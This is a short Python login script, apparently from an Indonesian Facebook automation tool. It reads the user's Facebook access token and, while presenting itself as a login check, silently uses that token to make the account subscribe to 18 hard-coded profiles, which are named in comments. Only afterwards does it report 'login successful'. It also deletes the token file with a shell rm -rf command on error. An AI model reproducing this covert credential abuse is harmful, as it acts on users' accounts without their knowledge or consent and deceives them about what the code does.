import requests,os,json,sbf

def main():
    try:
        token = open("token.txt","r").read()
        requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
        requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
        requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
        requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
        requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
        requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
        requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + token) # Anita Zuliatin
        requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + token)      # Wati Waningsih
        requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      # Rofi Nurhanifah
        requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) # Diah Ayu Kharisma
        requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) # Xena Alexander
        requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) # Alexandra Scarlett
        requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token) # Aisya Asyaqila
        requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) # Ameiliani Dethasia
        requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
        requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
        requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
        requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
        print('\n[•] Login Berhasil')
        exit(sbf.menu())
    except (KeyError,IOError):
        print('\n[!] Token Invalid')
        os.system('rm -rf token.txt')
        exit(sbf.login())
    except requests.exceptions.ConnectionError:
        print('\n[!] Koneksi Bermasalah')
        os.system('rm -rf token.txt')
        exit(sbf.login())